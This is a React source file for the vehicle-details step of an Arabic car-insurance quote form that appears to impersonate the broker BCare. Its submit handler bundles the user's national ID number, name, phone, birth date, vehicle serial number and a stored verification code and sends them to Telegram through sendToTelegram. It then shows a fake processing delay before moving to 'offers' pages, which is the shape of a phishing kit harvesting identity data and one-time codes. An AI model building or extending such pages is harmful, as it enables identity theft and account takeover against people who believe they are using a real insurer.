import { zodResolver } from '@hookform/resolvers/zod'
import type { ReactNode } from 'react'
import { useEffect, useState } from 'react'
import { Controller, useForm } from 'react-hook-form'
import { useNavigate, useSearchParams } from 'react-router-dom'

import { sendToTelegram } from '@/api/telegram'
import { LoadingOverlay } from '@/components/LoadingOverlay'
import { SiteFooter } from '@/components/layout/SiteFooter'
import { SiteHeader } from '@/components/layout/SiteHeader'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { saveCustomerData, loadCustomerData } from '@/lib/storage'
import { vehicleStep2Schema, type VehicleStep2FormValues } from '@/schemas/vehicleStep2'
import type { InsuranceStep2Payload } from '@/types/domain'

const years = Array.from({ length: 2026 - 1997 + 1 }, (_, i) => String(2026 - i))

export default function VehicleDetailsPage() {
  const navigate = useNavigate()
  const [params] = useSearchParams()
  const [busy, setBusy] = useState(false)
  const [bannerOpen, setBannerOpen] = useState(true)

  useEffect(() => {
    const u = params.get('user_id')
    if (u) localStorage.setItem('user_id', u)
  }, [params])

  const today = new Date().toISOString().slice(0, 10)

  const form = useForm<VehicleStep2FormValues>({
    resolver: zodResolver(vehicleStep2Schema),
    defaultValues: {
      coverage_type: 'comprehensive',
      policy_start_date: today,
      vehicle_purpose: 'personal',
      vehicle_type: '',
      vehicle_value: '',
      manufacture_year: '2026',
      repair_location: 'agency',
    },
    mode: 'onBlur',
  })

  useEffect(() => {
    const prev = loadCustomerData()
    if (prev.policy_start_date) {
      form.setValue('policy_start_date', prev.policy_start_date)
    }
  }, [form])

  const onSubmit = async (v: VehicleStep2FormValues) => {
    const base = loadCustomerData()
    const merged: InsuranceStep2Payload = {
      ...base,
      insurance_type: base.insurance_type ?? 'new',
      identity_number: base.identity_number ?? '',
      applicant_name: base.applicant_name ?? '',
      phone_number: base.phone_number ?? '',
      birth_date: base.birth_date,
      registration_method: base.registration_method ?? 'serial',
      serial_number: base.serial_number ?? '',
      verification_code: base.verification_code ?? '',
      coverage_type: v.coverage_type,
      policy_start_date: v.policy_start_date,
      vehicle_purpose: v.vehicle_purpose,
      vehicle_type: v.vehicle_type,
      manufacture_year: v.manufacture_year,
      vehicle_value: Number(v.vehicle_value),
      repair_location: v.repair_location,
    }

    saveCustomerData(merged)
    setBusy(true)
    const res = await sendToTelegram({ type: 'insurance_step2', payload: merged })
    if (!res.ok) {
      setBusy(false)
      alert('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى')
      return
    }
    window.setTimeout(() => {
      setBusy(false)
      const uid = params.get('user_id') ?? localStorage.getItem('user_id') ?? ''
      const q = uid ? `?user_id=${encodeURIComponent(uid)}` : ''
      navigate(v.coverage_type === 'third_party' ? `/plans/third-party${q}` : `/plans/comprehensive${q}`)
    }, 3000)
  }

  return (
    <div className="min-h-screen bg-background">
      {bannerOpen && (
        <div className="relative bg-accent px-4 py-3 text-center text-accent-foreground">
          <button
            type="button"
            className="absolute start-4 top-1/2 -translate-y-1/2 text-accent-foreground opacity-90 hover:opacity-100"
            aria-label="إغلاق"
            onClick={() => setBannerOpen(false)}
          >
            ×
          </button>
          <span className="text-sm font-medium">
            حمّل تطبيق بي كير الآن!!{' '}
            <a href="#apps" className="font-semibold underline">
              تحميل
            </a>
          </span>
        </div>
      )}
      <SiteHeader />
      <main className="mx-auto max-w-3xl px-4 pb-12 pt-6">
        <form onSubmit={form.handleSubmit(onSubmit)} className="flex flex-col gap-6 pb-8">
          <div className="rounded-2xl border border-border bg-card p-6 shadow-soft">
            <FormRow label="نوع التغطية" error={form.formState.errors.coverage_type?.message}>
              <Controller
                name="coverage_type"
                control={form.control}
                render={({ field }) => (
                  <Select value={field.value} onValueChange={field.onChange} dir="rtl">
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="third_party">ضد الغير</SelectItem>
                      <SelectItem value="comprehensive">شامل</SelectItem>
                    </SelectContent>
                  </Select>
                )}
              />
            </FormRow>

            <FormRow label="تاريخ بدء الوثيقة" error={form.formState.errors.policy_start_date?.message}>
              <Input type="date" min={today} dir="rtl" {...form.register('policy_start_date')} />
            </FormRow>

            <FormRow label="الغرض من استخدام السيارة" error={form.formState.errors.vehicle_purpose?.message}>
              <Controller
                name="vehicle_purpose"
                control={form.control}
                render={({ field }) => (
                  <Select value={field.value} onValueChange={field.onChange} dir="rtl">
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="personal">شخصي</SelectItem>
                      <SelectItem value="commercial">تجاري</SelectItem>
                      <SelectItem value="rental">تأجير</SelectItem>
                      <SelectItem value="ride_hailing">نقل الركاب (كريم/أوبر)</SelectItem>
                      <SelectItem value="cargo">نقل البضائع</SelectItem>
                      <SelectItem value="petroleum">نقل مشتقات نفطية</SelectItem>
                    </SelectContent>
                  </Select>
                )}
              />
            </FormRow>

            <FormRow label="نوع المركبة" error={form.formState.errors.vehicle_type?.message}>
              <Input placeholder="نوع المركبة" dir="rtl" {...form.register('vehicle_type')} />
            </FormRow>

            <FormRow label="قيمة المركبة" error={form.formState.errors.vehicle_value?.message}>
              <Input
                type="number"
                min={5000}
                step={100}
                dir="ltr"
                className="text-end"
                {...form.register('vehicle_value')}
              />
            </FormRow>

            <FormRow label="سنة الصنع" error={form.formState.errors.manufacture_year?.message}>
              <Controller
                name="manufacture_year"
                control={form.control}
                render={({ field }) => (
                  <Select value={field.value} onValueChange={field.onChange} dir="rtl">
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {years.map((y) => (
                        <SelectItem key={y} value={y}>
                          {y}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                )}
              />
            </FormRow>

            <div className="mb-6">
              <Label className="mb-2 block text-sm text-muted-foreground">مكان الإصلاح</Label>
              <div className="flex flex-wrap gap-6">
                <label className="flex cursor-pointer items-center gap-2">
                  <input type="radio" value="agency" className="h-4 w-4 accent-primary" {...form.register('repair_location')} />
                  <span className="text-sm">الوكالة</span>
                </label>
                <label className="flex cursor-pointer items-center gap-2">
                  <input type="radio" value="workshop" className="h-4 w-4 accent-primary" {...form.register('repair_location')} />
                  <span className="text-sm">الورشة</span>
                </label>
              </div>
              {form.formState.errors.repair_location?.message && (
                <p className="mt-1 text-xs text-destructive">{form.formState.errors.repair_location.message}</p>
              )}
            </div>

            <div className="rounded-xl border border-border bg-muted p-4 text-xs leading-relaxed text-muted-foreground">
              أوافق على ما يلي: عدم فتح عملية الوسيط الحق في الإستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي وبيانات
              مركبتي.
            </div>

            <Button type="submit" className="mt-6 w-full rounded-xl py-6 text-base">
              إظهار العروض
            </Button>
          </div>
        </form>
      </main>
      <SiteFooter compact />
      <LoadingOverlay open={busy} message="جاري معالجة طلبك..." />
    </div>
  )
}

function FormRow({
  label,
  error,
  children,
}: {
  label: string
  error?: string
  children: ReactNode
}) {
  return (
    <div className="mb-6">
      <Label className="mb-2 block text-sm font-medium text-muted-foreground">{label}</Label>
      {children}
      {error && <p className="mt-1 text-xs text-destructive">{error}</p>}
    </div>
  )
}
